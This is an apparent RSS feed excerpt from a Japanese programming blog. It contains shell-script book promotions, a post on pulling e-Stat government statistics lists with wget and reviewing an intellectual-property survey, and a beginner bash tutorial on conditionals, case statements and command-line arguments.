&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>e-Statで新着一覧を取得しよう</title><link>https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/</link><pubDate>Wed, 12 Jan 2022 13:40:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/anal.jpg" alt="Featured image of post e-Statで新着一覧を取得しよう" />&lt;h2 id="e-statで新着一覧を取得しよう">e-Statで新着一覧を取得しよう&lt;/h2>
&lt;p>毎日自動的に処理できるようにしたいので新着一覧を取得する必要があります。&lt;br>
新着一覧は、リスト取得用のAPIでupdateDateに日付を指定してその日の更新分を取得してくるようにしました。&lt;/p>
&lt;pre tabindex="0">&lt;code>wget &amp;quot;https://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsList?updatedDate=20220111&amp;amp;appId=xxxxxxxxxxxx&amp;amp;lang=J&amp;quot; -O new.csv
&lt;/code>&lt;/pre>&lt;p>STAT_CODEが政府統計コード、TABLE_INFがデータセットIDになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;0003254482&amp;quot;,&amp;quot;00552010&amp;quot;,&amp;quot;知的財産活動調査&amp;quot;,&amp;quot;00552&amp;quot;,&amp;quot;特許庁&amp;quot;,&amp;quot;知的財産活動調査&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;1-1&amp;quot;,&amp;quot;業種別出願件数階級別 売上高、営業利益高、経常
利益高、従業者数、研究関係従業者数及び研究費&amp;quot;,&amp;quot;（注1）各設問項目によって標本数が異なるため、例えば研究関係従業者数の集計結果が従業者数の集計結果を上回るなど、大小関係の逆転が生じ得る点に留意する必要がある。（注2）業種
「個人」において売上高等の記載される場合があるが、これは事業を営む個人事業主が調査票の業種を「個人」として回答したことによる。&amp;quot;,&amp;quot;業種別出願件数階級別&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;年
度次&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;2022-01-11&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;該当なし&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;2022-01-11&amp;quot;,&amp;quot;11&amp;quot;,&amp;quot;情報通信・科学技術&amp;quot;,&amp;quot;03&amp;quot;,&amp;quot;知的財産&amp;quot;
&lt;/code>&lt;/pre>&lt;p>データセットID（TABLE_INF）を使って個別データを取得しましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code>wget &amp;quot;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxxxxxxxx&amp;amp;lang=J&amp;amp;statsDataId=0003254482&amp;amp;metaGetFlg=Y&amp;amp;cntGetFlg=N&amp;amp;explanationGetFlg=Y&amp;amp;annotationGetFlg=Y&amp;amp;sectionHeaderFlg=1&amp;amp;replaceSpChars=0&amp;quot; -O 0003254482.csv
&lt;/code>&lt;/pre>&lt;h2 id="知的財産活動調査とは">知的財産活動調査とは&lt;/h2>
&lt;p>今日の課題は新着一覧に出てきた「知的財産活動調査」をどう処理するか検討してみましょう。&lt;/p>
&lt;p>知的財産活動調査は、我が国における知的財産活動の現状を定量的に把握することを目的とした一般統計調査とのことです。&lt;br>
特許権などの利用状況を調査したものみたいです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 121;
flex-basis: 290px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/dataset.jpg" data-size="1001x827">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/dataset.jpg"
width="1001"
height="827"
loading="lazy"
alt="データセット"
>
&lt;/a>
&lt;/a>
&lt;figcaption>データセット&lt;/figcaption>
&lt;/figure>&lt;br>
知的財産活動調査のデータセット数ですが１４０件もあります。&lt;br>
統計のデータセット数は１つの時もあればこのように１００を超える時もあるみたいです。&lt;br>
これだけデータセット数が多いとこの中から主要なデータセットを選択してサマリーを作成するのは大変ですね。&lt;/p>
&lt;p>google検索で「知的財産活動調査」の分析記事を調べてみると&lt;/p>
&lt;p>&lt;a class="link" href="https://www.semiconportal.com/archive/editorial/industry/17.html" target="_blank" rel="noopener"
>https://www.semiconportal.com/archive/editorial/industry/17.html&lt;/a>&lt;br>
知的財産担当者数は増加傾向にあり、2004年度は、約45,500人で前年度に比べ16.6 ％増加。&lt;br>
企業等の知的財産活動費は約9,200 億円で前年度に比べ17.1 ％増加。&lt;br>
特許権の活用状況 国内における2004年度の特許権の利用率は48.2 ％であり、依然として所有する権利の約半数が利用されていないことがわかる。&lt;/p>
&lt;p>&lt;a class="link" href="https://www.jstage.jst.go.jp/article/jasmin/2018s/0/2018s_246/_article/-char/ja/" target="_blank" rel="noopener"
>https://www.jstage.jst.go.jp/article/jasmin/2018s/0/2018s_246/_article/-char/ja/&lt;/a>&lt;br>
　研究開発活動が利益率に対して最も顕著なプラスの効果を持っていたのは「医薬品製造業」であった．また，研究費投資から利益率向上には25年程度のラグがあることも示された&lt;/p>
&lt;p>「知的財産担当者数」「知的財産活動費」「特許権の利用率」あたりがよく出るキーワードみたいです。&lt;/p>
&lt;p>主要なキーワードの抽出方法なのですが、「知的財産活動調査」のように統計名でgoogle検索した結果に対して、「知的財産担当者数」「知的財産活動費」などのデータセット名で検索して件数が多いものを主要なキーワードとして取り扱うことができるか検討してみたいと思います。&lt;/p>
&lt;p>「利益率」という面白いキーワードがあったのですが、統計の中にはそのままのデータはありませんでした。「経常利益高」という項目があるのでこれを「知的財産活動費」で割り算する必要がありそうです。&lt;br>
「利益率」が出せそうなら出してみるというのも検討してみると面白いかもしれません。&lt;/p>
&lt;p>主要なキーワードとしては、「知的財産担当者数」「知的財産活動費」「特許権の利用率」のようにその統計に固有のものもありますが、「利益率」「担当者数」「費用」「利用率」など汎用的に重要な項目もあるのかなと思いました。&lt;/p>
&lt;p>データセットの先頭にある「売上高、営業利益高、経常利益高、従業者数、研究関係従業者数及び研究費」は「特許権の利用率」は含まないものの「経常利益高」「知的財産担当者数」「知的財産活動費」を含むものでした。&lt;br>
データセットが大量にある統計の場合先頭のデータセットはまとめ的なデータになるのでしょうか。他の統計も見てみようと思います。&lt;/p>
&lt;p>データセットの中に「標本数」というものがありました。「標本数」は、アンケート結果の回収数です。データの信用性を図る上では大切な項目ですが、サマリーを作成する際は除外しても良い項目かもしれません。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 128;
flex-basis: 308px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/member.jpg" data-size="724x563">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/member.jpg"
width="724"
height="563"
loading="lazy"
alt="知的財産担当者数"
>
&lt;/a>
&lt;/a>
&lt;figcaption>知的財産担当者数&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 134;
flex-basis: 322px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/cost.jpg" data-size="796x592">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/cost.jpg"
width="796"
height="592"
loading="lazy"
alt="知的財産活動費"
>
&lt;/a>
&lt;/a>
&lt;figcaption>知的財産活動費&lt;/figcaption>
&lt;/figure>&lt;/p></description></item><item><title>【はじめから】ざっくりわかるシェルスクリプト２</title><link>https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/shellscript.jpg" alt="Featured image of post 【はじめから】ざっくりわかるシェルスクリプト２" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。&lt;/p>
&lt;p>この記事では、bashプログラミングの次のトピックについて説明します。&lt;/p>
&lt;h2 id="or-条件を-if文で使う">or 条件を if文で使う&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>orロジックでifステートメントを使用する：&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;||&amp;lsquo;は、ifステートメントでorロジックを定義するために使用されます。次のコードを使用して「if_with_or.sh」という名前のファイルを作成し、ifステートメントのorロジックの使用を確認します。ここで、nの値はユーザーから取得されます。値が15または45の場合、出力は「ゲームに勝ちました」になります。それ以外の場合、出力は「ゲームに負けました」になります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:if_with_or.sh" data-lang="bash:if_with_or.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;数値を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> n&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">15&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq 45&lt;span class="o">)&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ゲームに勝ちました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ゲームに負けました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash if_with_or.sh
数値を入力して下さい。
5
ゲームに負けました
$ bash if_with_or.sh
数値を入力して下さい。
45
ゲームに勝ちました
bash-5.1$
&lt;/code>&lt;/pre>&lt;table>
&lt;tr>&lt;td>比較演算子&lt;/td>&lt;td>使用例&lt;/td>&lt;td>意味&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-n&lt;/td>&lt;td>-n 文字列 &lt;/td>&lt;td>文字列の長さが0より大きければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-z&lt;/td>&lt;td>-z 文字列 &lt;/td>&lt;td>文字列の長さが0であれば真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>=&lt;/td>&lt;td>文字列A = 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>!=&lt;/td>&lt;td>文字列A != 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しくなければ真&lt;/td>&lt;/tr>
&lt;/table>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。&lt;/dd>
&lt;dd>また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="else-if-と-else">else if と else&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>else ifステートメントの使用：&lt;/b>&lt;/font>&lt;br>
else if条件の使用は、bashでは「elif」を定義します。&amp;lsquo;elseif_example.sh&amp;rsquo;という名前のファイルを作成し、次のスクリプトを追加して、bashスクリプトでelseifがどのように定義されているかを確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:elseif_example.sh" data-lang="bash:elseif_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたのラッキーナンバーを入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> n&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">101&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは一等賞を獲得しました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">510&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは二等賞を獲得しました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">999&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは三等賞を獲得しました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;すみません、またチャレンジして下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash$ bash elseif_example.sh
あなたのラッキーナンバーを入力して下さい。
101
あなたは一等賞を獲得しました
bash$ bash elseif_example.sh
あなたのラッキーナンバーを入力して下さい。
999
あなたは三等賞を獲得しました
bash$ bash elseif_example.sh
あなたのラッキーナンバーを入力して下さい。
100
すみません、またチャレンジして下さい
bash$ bash elseif_example.sh
$
&lt;/code>&lt;/pre>&lt;table>
&lt;tr>&lt;td>比較演算子&lt;/td>&lt;td>使用例&lt;/td>&lt;td>意味&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-n&lt;/td>&lt;td>-n 文字列 &lt;/td>&lt;td>文字列の長さが0より大きければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-z&lt;/td>&lt;td>-z 文字列 &lt;/td>&lt;td>文字列の長さが0であれば真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>=&lt;/td>&lt;td>文字列A = 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>!=&lt;/td>&lt;td>文字列A != 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しくなければ真&lt;/td>&lt;/tr>
&lt;/table>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。&lt;/dd>
&lt;dd>また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="case-文">case 文&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>caseステートメントの使用：&lt;/b>&lt;/font>&lt;br>
caseステートメントは、if-elseif-elseステートメントの代わりに使用されます。このステートメントの開始ブロックと終了ブロックは、「case」と「esac」によって定義されます。&amp;lsquo;case_example.sh&amp;rsquo;という名前の新しいファイルを作成し、次のスクリプトを追加します。次のスクリプトの出力は、例として前のelseと同じになります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:case_example.sh" data-lang="bash:case_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたのラッキーナンバーを入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> n&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> in
101&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは一等賞を獲得しました&amp;#34;&lt;/span> &lt;span class="p">;;&lt;/span>
510&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは二等賞を獲得しました&amp;#34;&lt;/span> &lt;span class="p">;;&lt;/span>
999&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは三等賞を獲得しました&amp;#34;&lt;/span> &lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;すみません、またチャレンジして下さい&amp;#34;&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
101
あなたは一等賞を獲得しました
bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
510
あなたは二等賞を獲得しました
bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
999
あなたは三等賞を獲得しました
bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
777
すみません、またチャレンジして下さい
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>case文の終わりには esac を指定します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="コマンドラインから引数を取得">コマンドラインから引数を取得&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>コマンドラインから引数を取得：&lt;/b>&lt;/font>&lt;br>
Bashスクリプトは、他のプログラミング言語と同様に、コマンドライン引数から入力を読み取ることができます。たとえば、$1と$2の変数は、最初と2番目のコマンドライン引数を読み取るために使用されます。「command_line.sh」という名前のファイルを作成し、次のスクリプトを追加します。次のスクリプトによって読み取られた2つの引数値は、引数の総数と引数値を出力として出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:command_line.sh" data-lang="bash:command_line.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;引数の数 : &lt;/span>&lt;span class="nv">$#&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;一つ目の引数 = &lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;二つ目の引数 = &lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash command_line.sh apple windows
引数の数 : 2
一つ目の引数 = apple
二つ目の引数 = windows
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>echo の引数として変数を渡すときは、&amp;quot;$1&amp;quot; のようにダブルクォートで囲む癖をつけます。&lt;/dd>
&lt;dd>$1 のようにダブルクォートで囲まずに変数をそのまま記述してしまうと、値として連続するスペースが含まれていたときに1つのスペースにまとめられてしまいます。また、値が入っていない場合に、正しく処理ができなくなります。&lt;/dd>
&lt;dd>シェルスクリプトの変数はほとんどの場合は &amp;ldquo;$value&amp;rdquo; と囲みます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="名前を使用してコマンドラインから引数を取得する">名前を使用してコマンドラインから引数を取得する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>コマンドラインから名前付きの引数を取得：&lt;/b>&lt;/font>&lt;br>
名前付きのコマンドライン引数を読み取る方法を示します。&amp;lsquo;command_line_names.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、XとYの2つの引数がこのスクリプトによって読み取られ、XとYの合計が出力されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:command_line_names.sh" data-lang="bash:command_line_names.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> arg in &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nv">index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$arg&lt;/span> &lt;span class="p">|&lt;/span> cut -f1 -d&lt;span class="o">=&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">val&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$arg&lt;/span> &lt;span class="p">|&lt;/span> cut -f2 -d&lt;span class="o">=&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nv">$index&lt;/span> in
X&lt;span class="o">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$val&lt;/span>&lt;span class="p">;;&lt;/span>
Y&lt;span class="o">)&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$val&lt;/span>&lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">result&lt;/span>&lt;span class="o">=&lt;/span>x+y&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;X+Y=&lt;/span>&lt;span class="nv">$result&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドで二つのコマンドライン引数を使用して、ファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash command_line_names.sh X=45 Y=30
X+Y=75
$
